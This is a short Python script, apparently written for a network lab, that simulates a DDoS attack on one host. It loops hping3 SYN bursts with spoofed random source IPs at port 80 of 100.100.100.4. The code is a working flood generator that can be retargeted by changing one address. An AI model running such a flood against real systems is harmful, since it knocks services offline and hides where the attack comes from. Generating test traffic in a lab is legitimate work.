#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Created on Wed Apr 10 01:54:20 2019

@author: Yousuf

To generate random traffic to simulate a DDoS attack to host 4

"""

import threading
import random
import os

#A function to generate packets through hping3 to a specific port. This function runs every 2 seconds. 
def generate_ddos():
    num_packets = random.randint(20,70)
    src_port = random.randint(0,65535)
    source_ip = generate_ip()
    
    os.system("hping3 -S -V -s %s -k -p 80 -i u10000 -c %s --spoof %s 100.100.100.4" %(src_port,num_packets,source_ip))
    print ("hping3 -S -V -s %s -k -p 80 -i u10000 -c %s --spoof %s 100.100.100.4" %(src_port,num_packets,source_ip))
    
    threading.Timer(2,generate_ddos).start()

#Helper Function
def generate_ip():
    pos_1 = random.randint(0,255)
    pos_2 = random.randint(0,255)
    pos_3 = random.randint(0,255)
    pos_4 = random.randint(0,255)
    
    ip = str(pos_1) + "." + str(pos_2) + "." + str(pos_3) + "." + str(pos_4)
    return ip


generate_ddos()


